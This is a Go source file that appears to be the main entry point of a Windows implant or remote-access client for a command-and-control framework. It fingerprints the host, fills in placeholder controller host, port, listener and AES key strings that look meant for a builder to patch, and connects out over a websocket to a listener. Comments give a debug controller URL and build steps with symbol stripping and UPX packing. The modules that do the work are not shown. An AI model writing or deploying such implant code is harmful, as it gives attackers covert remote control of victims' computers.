//go:build windows
// +build windows

package main

import (
	"fmt"

	"main/PcInfo"
	Websocket "main/Socket/ws"
	"strings"

	"golang.org/x/sys/windows/registry"
)

// var host = "192.168.8.123" // assuming for the sake of example
// var port = "4000"

var ClientWorking bool

func getClrVersion() string {
	key, err := registry.OpenKey(registry.LOCAL_MACHINE, `SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v4\\Full`, registry.QUERY_VALUE)
	if err != nil {
		return "v2.0" // If the registry cannot be accessed, assume CLR 2.0 is returned
	}
	defer key.Close()

	// If the Release key is present, CLR 4.0 or higher is installed
	if _, _, err := key.GetIntegerValue("Release"); err == nil {
		return "v4.0"
	}

	return "v2.0"
}

func main() {

	PcInfo.ProcessID = PcInfo.GetProcessID()
	PcInfo.HWID = PcInfo.GetHWID()
	PcInfo.ClrVersion = getClrVersion()
	PcInfo.GroupInfo = "Windows"
	PcInfo.ClientComputer = PcInfo.GetClientComputer()
	//release
	Host := "HostAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHJJJJ"
	Port := "PortAAAABBBBCCCCDDDD"
	ListenerName := "ListenNameAAAABBBBCCCCDDDD"
	route := "RouteAAAABBBBCCCCDDDD"
	PcInfo.AesKey = "AeskAAAABBBBCCCC"
	PcInfo.Host = strings.ReplaceAll(Host, " ", "")
	PcInfo.Port = strings.ReplaceAll(Port, " ", "")
	PcInfo.ListenerName = strings.ReplaceAll(ListenerName, " ", "")

	///Debug
	// Host := "10.211.55.4"
	// Port := "4000"
	// PcInfo.ListenerName = "asd"
	// PcInfo.AesKey = "QWERt_CSDMAHUATW"
	// route := "www"
	// // //url := "ws://www.sftech.shop:443//www"
	url := "ws://" + Host + ":" + Port + "/" + route

	// url := "ws://tests.sftech.shop:443/Echo"
	url = strings.ReplaceAll(url, " ", "")
	fmt.Println(url)
	Websocket.Run_main(url)

}

//cmd:
//Linux：
//set GOOS=linux
//set GOARCH=amd64

//windows:
//set GOOS=windows
//set GOARCH=amd64

//powershell:
//Linux:
//$env:GOOS="linux"
//$env:GOARCH="amd64"
//Windows:
//$env:GOOS="windows"
//$env:GOARCH="amd64"

//CGO_ENABLED=0 GOOS=linux go build -a -ldflags="-s -w" -installsuffix cgo -o Winmain.exe main.go && upx -9 Client
//set GOARCH=mips
//set GOOS=linux

//MacOS
//set GOOS=darwin
//set GOARCH=amd64
